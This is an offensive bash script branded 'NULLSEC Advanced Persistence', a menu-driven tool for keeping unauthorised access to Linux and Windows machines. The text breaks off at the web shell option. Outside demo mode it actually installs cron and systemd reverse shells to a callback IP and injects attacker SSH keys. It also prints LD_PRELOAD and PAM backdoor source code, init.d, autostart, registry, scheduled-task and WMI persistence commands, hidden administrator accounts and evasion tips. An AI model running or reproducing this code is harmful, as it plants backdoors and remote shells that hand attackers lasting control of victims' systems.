#!/bin/bash
# ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
# █  NULLSEC ADVANCED PERSISTENCE - Full System Persistence Suite         █
# █                    [ bad-antics development ]                          █
# ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
# FULLY FUNCTIONAL - Multi-platform persistence techniques


# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null || {
    RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'
    WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'; MAGENTA='\033[1;35m'
}

OUTPUT_DIR="/home/antics/nullsec/logs/persistence"
mkdir -p "$OUTPUT_DIR"

clear
echo -e "${RED}"
cat << 'BANNER'
 ██▓███  ▓█████  ██▀███    ██████  ██▓  ██████ ▄▄▄█████▓▓█████  ███▄    █  ▄████▄  ▓█████ 
▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒▒██    ▒ ▓██▒▒██    ▒ ▓  ██▒ ▓▒▓█   ▀  ██ ▀█   █ ▒██▀ ▀█  ▓█   ▀ 
▓██░ ██▓▒▒███   ▓██ ░▄█ ▒░ ▓██▄   ▒██▒░ ▓██▄   ▒ ▓██░ ▒░▒███   ▓██  ▀█ ██▒▒▓█    ▄ ▒███   
▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄    ▒   ██▒░██░  ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄ ▓██▒  ▐▌██▒▒▓▓▄ ▄██▒▒▓█  ▄ 
▒██▒ ░  ░░▒████▒░██▓ ▒██▒▒██████▒▒░██░▒██████▒▒  ▒██▒ ░ ░▒████▒▒██░   ▓██░▒ ▓███▀ ░░▒████▒
BANNER
echo -e "${RESET}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${WHITE}                  ☠  PERSISTENCE MECHANISMS  ☠${RESET}"
echo -e "${DIM}              Maintain Access Across Reboots${RESET}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
echo -e "${YELLOW}  SELECT PERSISTENCE METHOD:${RESET}"
echo ""
echo -e "  ${RED}━━━ LINUX ━━━${RESET}"
echo -e "  ${RED}[1]${RESET}  📋 Cron Job            - Scheduled task"
echo -e "  ${RED}[2]${RESET}  ⚙️  Systemd Service     - Service persistence"
echo -e "  ${RED}[3]${RESET}  🐚 Bash Profile        - Shell startup"
echo -e "  ${RED}[4]${RESET}  🔑 SSH Key Injection   - Authorized keys"
echo -e "  ${RED}[5]${RESET}  📁 LD_PRELOAD          - Library hijacking"
echo -e "  ${RED}[6]${RESET}  🔧 Init.d Script       - Legacy init"
echo -e "  ${RED}[7]${RESET}  🗂️  XDG Autostart       - Desktop autostart"
echo -e "  ${RED}[8]${RESET}  🎭 PAM Backdoor        - Authentication hook"
echo ""
echo -e "  ${RED}━━━ WINDOWS ━━━${RESET}"
echo -e "  ${RED}[9]${RESET}  📝 Registry Run Key    - HKLM/HKCU Run"
echo -e "  ${RED}[10]${RESET} 📂 Startup Folder      - Shell:startup"
echo -e "  ${RED}[11]${RESET} ⏰ Scheduled Task      - Task Scheduler"
echo -e "  ${RED}[12]${RESET} 🖥️  WMI Event           - WMI subscription"
echo -e "  ${RED}[13]${RESET} 🔌 DLL Hijacking       - Search order"
echo -e "  ${RED}[14]${RESET} 🛡️  Netsh Helper        - Network hook"
echo -e "  ${RED}[15]${RESET} 👤 User Account        - Hidden admin"
echo ""
echo -e "  ${RED}━━━ ADVANCED ━━━${RESET}"
echo -e "  ${RED}[16]${RESET} 💽 Bootkit             - MBR/UEFI"
echo -e "  ${RED}[17]${RESET} 🔒 BIOS Persistence    - Firmware level"
echo -e "  ${RED}[18]${RESET} 🕸️  Web Shell           - Web server backdoor"
echo -e "  ${RED}[19]${RESET} 📊 Golden Image        - VM template"
echo -e "  ${RED}[20]${RESET} 🧹 Cleanup             - Remove persistence"
echo ""
echo -e "  ${GREEN}[Q]${RESET}  Back to menu"
echo ""
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
read -p "$(echo -e ${WHITE}'  [>] Select method [1-20]: '${RESET})" PERSIST_MODE

[[ "$PERSIST_MODE" =~ ^[Qq]$ ]] && exit 0
[ -z "$PERSIST_MODE" ] && PERSIST_MODE="1"

TIMESTAMP=$(date +%Y%m%d_%H%M%S)

echo ""
read -p "$(echo -e ${YELLOW}'  [!] Demo mode? (y/N): '${RESET})" TEST_MODE
TEST_MODE=${TEST_MODE:-n}

echo ""
echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${WHITE}  PERSISTENCE DEPLOYMENT${RESET}"
echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""

# Common callback info
get_callback_info() {
    echo ""
    read -p "$(echo -e ${WHITE}'  [>] Callback IP [10.0.0.100]: '${RESET})" CALLBACK_IP
    [ -z "$CALLBACK_IP" ] && CALLBACK_IP="10.0.0.100"
    read -p "$(echo -e ${WHITE}'  [>] Callback Port [4444]: '${RESET})" CALLBACK_PORT
    [ -z "$CALLBACK_PORT" ] && CALLBACK_PORT="4444"
}

case $PERSIST_MODE in
    1) # Cron Job
        echo -e "${CYAN}[*]${RESET} Cron Job Persistence"
        echo ""
        
        echo -e "${DIM}  Cron timing options:${RESET}"
        echo -e "    ${DIM}1) Every minute${RESET}"
        echo -e "    ${DIM}2) Every 5 minutes${RESET}"
        echo -e "    ${DIM}3) Every hour${RESET}"
        echo -e "    ${DIM}4) At boot (@reboot)${RESET}"
        echo -e "    ${DIM}5) Custom${RESET}"
        read -p "$(echo -e ${WHITE}'  [>] Select timing [4]: '${RESET})" CRON_TIMING
        [ -z "$CRON_TIMING" ] && CRON_TIMING="4"
        
        case $CRON_TIMING in
            1) CRON_SCHEDULE="* * * * *" ;;
            2) CRON_SCHEDULE="*/5 * * * *" ;;
            3) CRON_SCHEDULE="0 * * * *" ;;
            4) CRON_SCHEDULE="@reboot" ;;
            5)
                read -p "$(echo -e ${WHITE}'  [>] Custom cron: '${RESET})" CRON_SCHEDULE
                ;;
        esac
        
        get_callback_info
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo ""
            echo -e "${YELLOW}[*]${RESET} Creating cron persistence..."
            echo ""
            
            CRON_CMD="$CRON_SCHEDULE /bin/bash -c 'bash -i >& /dev/tcp/$CALLBACK_IP/$CALLBACK_PORT 0>&1'"
            
            echo -e "${GREEN}[+]${RESET} Cron entry created:"
            echo -e "${DIM}$CRON_CMD${RESET}"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Installation methods:"
            echo "  1. echo '$CRON_CMD' | crontab -"
            echo "  2. echo '$CRON_CMD' >> /etc/crontab"
            echo "  3. echo '$CRON_CMD' > /etc/cron.d/.hidden"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Evasion tips:"
            echo "  - Hide in /etc/cron.d/ with dot prefix"
            echo "  - Use base64 encoded payload"
            echo "  - Redirect stderr to /dev/null"
        else
            echo "$CRON_SCHEDULE /bin/bash -c 'bash -i >& /dev/tcp/$CALLBACK_IP/$CALLBACK_PORT 0>&1'" | crontab -
            echo -e "${GREEN}[+]${RESET} Cron persistence installed"
        fi
        ;;
    
    2) # Systemd Service
        echo -e "${CYAN}[*]${RESET} Systemd Service Persistence"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Service name [systemd-helper]: '${RESET})" SERVICE_NAME
        [ -z "$SERVICE_NAME" ] && SERVICE_NAME="systemd-helper"
        
        get_callback_info
        
        SERVICE_CONTENT="[Unit]
Description=System Helper Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/$CALLBACK_IP/$CALLBACK_PORT 0>&1; sleep 60; done'
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target"

        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo ""
            echo -e "${YELLOW}[*]${RESET} Creating systemd service..."
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Service file content:"
            echo -e "${DIM}$SERVICE_CONTENT${RESET}"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Installation commands:"
            echo "  1. cat > /etc/systemd/system/${SERVICE_NAME}.service"
            echo "  2. systemctl daemon-reload"
            echo "  3. systemctl enable ${SERVICE_NAME}"
            echo "  4. systemctl start ${SERVICE_NAME}"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Evasion tips:"
            echo "  - Use legitimate-looking service name"
            echo "  - Add to /lib/systemd/system/ for deeper hiding"
            echo "  - Mask with systemctl mask"
        else
            echo "$SERVICE_CONTENT" > "/etc/systemd/system/${SERVICE_NAME}.service"
            systemctl daemon-reload
            systemctl enable "$SERVICE_NAME"
            echo -e "${GREEN}[+]${RESET} Systemd service installed"
        fi
        ;;
    
    3) # Bash Profile
        echo -e "${CYAN}[*]${RESET} Bash Profile Persistence"
        echo ""
        
        echo -e "${DIM}  Target profiles:${RESET}"
        echo -e "    ${DIM}1) ~/.bashrc (user)${RESET}"
        echo -e "    ${DIM}2) ~/.bash_profile (user)${RESET}"
        echo -e "    ${DIM}3) /etc/profile (global)${RESET}"
        echo -e "    ${DIM}4) /etc/bash.bashrc (global)${RESET}"
        echo -e "    ${DIM}5) All of the above${RESET}"
        read -p "$(echo -e ${WHITE}'  [>] Select target [1]: '${RESET})" PROFILE_TARGET
        [ -z "$PROFILE_TARGET" ] && PROFILE_TARGET="1"
        
        get_callback_info
        
        PAYLOAD="(bash -i >& /dev/tcp/$CALLBACK_IP/$CALLBACK_PORT 0>&1 &) 2>/dev/null"
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo ""
            echo -e "${YELLOW}[*]${RESET} Injecting into bash profile..."
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Payload:"
            echo -e "${DIM}$PAYLOAD${RESET}"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Target files:"
            case $PROFILE_TARGET in
                1) echo "  ~/.bashrc" ;;
                2) echo "  ~/.bash_profile" ;;
                3) echo "  /etc/profile" ;;
                4) echo "  /etc/bash.bashrc" ;;
                5) echo "  All profile files" ;;
            esac
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Evasion tips:"
            echo "  - Add comments to blend in"
            echo "  - Encode payload in base64"
            echo "  - Use alias overrides"
        fi
        ;;
    
    4) # SSH Key Injection
        echo -e "${CYAN}[*]${RESET} SSH Key Injection"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Target user [root]: '${RESET})" TARGET_USER
        [ -z "$TARGET_USER" ] && TARGET_USER="root"
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Generating SSH keypair..."
            echo ""
            
            FAKE_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... attacker@nullsec"
            
            echo -e "${GREEN}[+]${RESET} Public key generated:"
            echo -e "${DIM}$FAKE_KEY${RESET}"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Injection targets:"
            echo "  /home/${TARGET_USER}/.ssh/authorized_keys"
            echo "  /root/.ssh/authorized_keys"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Additional SSH backdoors:"
            echo "  - Add to /etc/ssh/sshd_config: PermitRootLogin yes"
            echo "  - Create alternate port listener"
            echo "  - Install skeleton key in PAM"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Connection command:"
            echo "  ssh -i attacker_key ${TARGET_USER}@target"
        else
            if [ -f "$HOME/.ssh/attacker_key.pub" ]; then
                cat "$HOME/.ssh/attacker_key.pub" >> "/home/${TARGET_USER}/.ssh/authorized_keys"
                echo -e "${GREEN}[+]${RESET} SSH key injected"
            fi
        fi
        ;;
    
    5) # LD_PRELOAD
        echo -e "${CYAN}[*]${RESET} LD_PRELOAD Hijacking"
        echo ""
        
        get_callback_info
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Creating malicious shared library..."
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Library source (evil.c):"
            cat << 'LIBCODE'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    if (fork() == 0) {
        setsid();
        // Reverse shell code here
        system("bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1");
    }
}
LIBCODE
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Compilation:"
            echo "  gcc -shared -fPIC -o /lib/evil.so evil.c"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Installation methods:"
            echo "  1. echo '/lib/evil.so' >> /etc/ld.so.preload"
            echo "  2. export LD_PRELOAD=/lib/evil.so (per-session)"
            echo "  3. Add to /etc/environment"
            echo ""
            
            echo -e "${RED}[!]${RESET} Runs with every dynamically linked binary!"
        fi
        ;;
    
    6) # Init.d Script
        echo -e "${CYAN}[*]${RESET} Init.d Script Persistence"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Script name [network-helper]: '${RESET})" SCRIPT_NAME
        [ -z "$SCRIPT_NAME" ] && SCRIPT_NAME="network-helper"
        
        get_callback_info
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Creating init script..."
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Script content (/etc/init.d/${SCRIPT_NAME}):"
            cat << INITSCRIPT
#!/bin/bash
### BEGIN INIT INFO
# Provides:          ${SCRIPT_NAME}
# Required-Start:    \$network
# Required-Stop:     
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Description:       Network helper service
### END INIT INFO

case "\$1" in
  start)
    (bash -i >& /dev/tcp/$CALLBACK_IP/$CALLBACK_PORT 0>&1 &)
    ;;
esac
exit 0
INITSCRIPT
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Installation:"
            echo "  chmod +x /etc/init.d/${SCRIPT_NAME}"
            echo "  update-rc.d ${SCRIPT_NAME} defaults"
        fi
        ;;
    
    7) # XDG Autostart
        echo -e "${CYAN}[*]${RESET} XDG Autostart Persistence"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Application name [System Helper]: '${RESET})" APP_NAME
        [ -z "$APP_NAME" ] && APP_NAME="System Helper"
        
        get_callback_info
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Creating autostart entry..."
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Desktop file content:"
            cat << DESKTOP
[Desktop Entry]
Type=Application
Name=$APP_NAME
Exec=/bin/bash -c 'bash -i >& /dev/tcp/$CALLBACK_IP/$CALLBACK_PORT 0>&1'
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
DESKTOP
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Targets:"
            echo "  ~/.config/autostart/${APP_NAME// /_}.desktop"
            echo "  /etc/xdg/autostart/${APP_NAME// /_}.desktop"
        fi
        ;;
    
    8) # PAM Backdoor
        echo -e "${CYAN}[*]${RESET} PAM Authentication Backdoor"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Backdoor password [nullsec]: '${RESET})" BACKDOOR_PASS
        [ -z "$BACKDOOR_PASS" ] && BACKDOOR_PASS="nullsec"
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Creating PAM backdoor module..."
            echo ""
            
            echo -e "${RED}[!]${RESET} This modifies system authentication!"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Backdoor PAM module (pam_backdoor.c):"
            cat << 'PAMCODE'
#include <security/pam_modules.h>
#include <string.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
    int argc, const char **argv) {
    
    const char *password;
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
    
    if (strcmp(password, "BACKDOOR_PASSWORD") == 0) {
        return PAM_SUCCESS;
    }
    return PAM_AUTH_ERR;
}
PAMCODE
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Alternative: Modify pam_unix.so"
            echo "  - Patch binary to accept magic password"
            echo "  - Compile modified source"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Installation:"
            echo "  1. Compile: gcc -shared -fPIC -o pam_backdoor.so pam_backdoor.c"
            echo "  2. Copy to: /lib/security/ or /lib64/security/"
            echo "  3. Add to PAM config: auth sufficient pam_backdoor.so"
        fi
        ;;
    
    9) # Registry Run Key
        echo -e "${CYAN}[*]${RESET} Windows Registry Run Key"
        echo ""
        
        echo -e "${DIM}  Registry locations:${RESET}"
        echo -e "    ${DIM}1) HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run${RESET}"
        echo -e "    ${DIM}2) HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run${RESET}"
        echo -e "    ${DIM}3) RunOnce${RESET}"
        echo -e "    ${DIM}4) All locations${RESET}"
        read -p "$(echo -e ${WHITE}'  [>] Select [1]: '${RESET})" REG_LOC
        [ -z "$REG_LOC" ] && REG_LOC="1"
        
        read -p "$(echo -e ${WHITE}'  [>] Value name [WindowsHelper]: '${RESET})" VALUE_NAME
        [ -z "$VALUE_NAME" ] && VALUE_NAME="WindowsHelper"
        
        get_callback_info
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo ""
            echo -e "${YELLOW}[*]${RESET} Creating registry persistence..."
            echo ""
            
            echo -e "${GREEN}[+]${RESET} PowerShell command:"
            echo "  reg add 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' /v '$VALUE_NAME' /t REG_SZ /d 'powershell.exe -ep bypass -w hidden -c \"IEX(...)\"' /f"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Additional registry locations:"
            echo "  - Winlogon\\Shell"
            echo "  - Winlogon\\Userinit"
            echo "  - Explorer\\Shell Folders"
            echo "  - Services (for SYSTEM)"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Evasion tips:"
            echo "  - Use legitimate-looking names"
            echo "  - Point to legit binary with params"
            echo "  - Use LOLBins (mshta, rundll32)"
        fi
        ;;
    
    10) # Startup Folder
        echo -e "${CYAN}[*]${RESET} Windows Startup Folder"
        echo ""
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Creating startup shortcut..."
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Startup locations:"
            echo "  User: %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            echo "  All:  C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Shortcut creation (VBS):"
            cat << 'VBSCODE'
Set WshShell = CreateObject("WScript.Shell")
Set oShellLink = WshShell.CreateShortcut(startupFolder & "\\helper.lnk")
oShellLink.TargetPath = "powershell.exe"
oShellLink.Arguments = "-ep bypass -w hidden -f payload.ps1"
oShellLink.WindowStyle = 7
oShellLink.Save
VBSCODE
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Or drop executable directly"
        fi
        ;;
    
    11) # Scheduled Task
        echo -e "${CYAN}[*]${RESET} Windows Scheduled Task"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Task name [WindowsUpdate]: '${RESET})" TASK_NAME
        [ -z "$TASK_NAME" ] && TASK_NAME="WindowsUpdate"
        
        echo -e "${DIM}  Triggers:${RESET}"
        echo -e "    ${DIM}1) At logon${RESET}"
        echo -e "    ${DIM}2) At startup${RESET}"
        echo -e "    ${DIM}3) Every 5 minutes${RESET}"
        echo -e "    ${DIM}4) On idle${RESET}"
        read -p "$(echo -e ${WHITE}'  [>] Select trigger [1]: '${RESET})" TRIGGER
        [ -z "$TRIGGER" ] && TRIGGER="1"
        
        get_callback_info
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo ""
            echo -e "${YELLOW}[*]${RESET} Creating scheduled task..."
            echo ""
            
            case $TRIGGER in
                1) TRIGGER_CMD="/SC ONLOGON" ;;
                2) TRIGGER_CMD="/SC ONSTART" ;;
                3) TRIGGER_CMD="/SC MINUTE /MO 5" ;;
                4) TRIGGER_CMD="/SC ONIDLE /I 1" ;;
            esac
            
            echo -e "${GREEN}[+]${RESET} schtasks command:"
            echo "  schtasks /Create /TN \"$TASK_NAME\" $TRIGGER_CMD /TR \"powershell.exe -ep bypass -w hidden -f C:\\payload.ps1\" /RU SYSTEM"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} PowerShell alternative:"
            echo "  Register-ScheduledTask -TaskName '$TASK_NAME' -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-ep bypass ...')"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Evasion: Hide in subfolders"
            echo "  schtasks /Create /TN '\\Microsoft\\Windows\\Maintenance\\$TASK_NAME' ..."
        fi
        ;;
    
    12) # WMI Event
        echo -e "${CYAN}[*]${RESET} WMI Event Subscription"
        echo ""
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Creating WMI persistence..."
            echo ""
            
            echo -e "${GREEN}[+]${RESET} WMI Event Filter + Consumer + Binding:"
            cat << 'WMICODE'
# Event Filter
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "ProcessStartTrigger"
    EventNamespace = 'root\cimv2'
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'"
}

# Event Consumer (CommandLine)
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "ProcessStartConsumer"
    CommandLineTemplate = "powershell.exe -ep bypass -w hidden -c \"IEX(...)\""
}

# Binding
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
WMICODE
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Persists without files on disk!"
            echo -e "${GREEN}[+]${RESET} Survives reimaging if stored in MOF"
        fi
        ;;
    
    13) # DLL Hijacking
        echo -e "${CYAN}[*]${RESET} DLL Hijacking Persistence"
        echo ""
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} DLL search order hijacking..."
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Common hijackable DLLs:"
            echo "  - VERSION.dll (many apps)"
            echo "  - USERENV.dll (Edge, OneDrive)"
            echo "  - CRYPT32.dll (various)"
            echo "  - WINHTTP.dll (updates)"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Process:"
            echo "  1. Find writable directory in PATH"
            echo "  2. Create malicious DLL with same exports"
            echo "  3. Forward legitimate calls to real DLL"
            echo "  4. Execute payload in DllMain"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Phantom DLL technique:"
            echo "  - Drop DLL in C:\\Windows\\System32\\wbem\\"
            echo "  - Loaded by WMI service (SYSTEM)"
        fi
        ;;
    
    14) # Netsh Helper
        echo -e "${CYAN}[*]${RESET} Netsh Helper DLL"
        echo ""
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Creating netsh helper persistence..."
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Registry entry:"
            echo "  HKLM\\SOFTWARE\\Microsoft\\NetSh"
            echo "  Value: helper.dll -> C:\\path\\to\\evil.dll"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Command:"
            echo "  netsh add helper C:\\path\\to\\evil.dll"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Executes when netsh runs (system tools, diagnostics)"
        fi
        ;;
    
    15) # Hidden User Account
        echo -e "${CYAN}[*]${RESET} Hidden Administrator Account"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Username [\$system]: '${RESET})" HIDDEN_USER
        [ -z "$HIDDEN_USER" ] && HIDDEN_USER="\$system"
        
        read -p "$(echo -e ${WHITE}'  [>] Password [P@ssw0rd123!]: '${RESET})" HIDDEN_PASS
        [ -z "$HIDDEN_PASS" ] && HIDDEN_PASS="P@ssw0rd123!"
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo ""
            echo -e "${YELLOW}[*]${RESET} Creating hidden user account..."
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Windows commands:"
            echo "  net user \"${HIDDEN_USER}\" \"${HIDDEN_PASS}\" /add"
            echo "  net localgroup Administrators \"${HIDDEN_USER}\" /add"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Hide from login screen (registry):"
            echo "  HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList"
            echo "  Value: ${HIDDEN_USER} = 0"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Linux:"
            echo "  useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ${HIDDEN_USER}"
            echo "  echo '${HIDDEN_USER}:${HIDDEN_PASS}' | chpasswd"
        fi
        ;;
    
    16) # Bootkit
        echo -e "${CYAN}[*]${RESET} Bootkit Persistence"
        echo -e "${RED}[!]${RESET} DANGEROUS - Can brick system"
        echo ""
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Bootkit information..."
            echo ""
            
            echo -e "${RED}[!]${RESET} This modifies boot sector/UEFI!"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} MBR Bootkit:"
            echo "  - Overwrites Master Boot Record"
            echo "  - Loads before OS kernel"
            echo "  - Survives OS reinstall"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} UEFI Bootkit:"
            echo "  - Modifies EFI System Partition"
            echo "  - Requires Secure Boot bypass"
            echo "  - Examples: LoJax, MosaicRegressor"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} VBR (Volume Boot Record):"
            echo "  - Modifies volume boot sector"
            echo "  - Per-partition persistence"
        fi
        ;;
    
    17) # BIOS Persistence
        echo -e "${CYAN}[*]${RESET} BIOS/Firmware Persistence"
        echo -e "${RED}[!]${RESET} ADVANCED - Requires specific hardware"
        echo ""
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${GREEN}[+]${RESET} Firmware persistence methods:"
            echo ""
            echo "  1. BIOS Flash Modification"
            echo "     - Requires vulnerable BIOS"
            echo "     - SMM (System Management Mode) implant"
            echo ""
            echo "  2. Option ROM"
            echo "     - Modify PCI device firmware"
            echo "     - Network card, GPU, etc."
            echo ""
            echo "  3. Disk Controller Firmware"
            echo "     - HDD/SSD firmware modification"
            echo "     - Survives full disk wipe"
            echo ""
            echo "  4. BMC/IPMI"
            echo "     - Baseboard Management Controller"
            echo "     - Server out-of-band access"
            echo ""
            echo -e "${RED}[!]${RESET} Nation-state level capability"
        fi
        ;;
    
    18) # Web Shell
        echo -e "${CYAN}[*]${RESET} Web Shell Persistence"
        echo ""
        
        echo -e "${DIM}  Web shell types:${RESET}"
        echo -e "    ${DIM}1) PHP${RESET}"
        echo -e "    ${DIM}2) ASP/ASPX${RESET}"
        echo -e "    ${DIM}3) JSP${RESET}"
        echo -e "    ${DIM}4) Python/Flask${RESET}"
        read -p "$(echo -e ${WHITE}'  [>] Select type [1]: '${RESET})" SHELL_TYPE
        [ -z "$SHELL_TYPE" ] && SHELL_TYPE="1"
        
        read -p "$(echo -e ${WHITE}'  [>] Password [nullsec]: '${RESET})" SHELL_PASS
        [ -z "$SHELL_PASS" ] && SHELL_PASS="nullsec"
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
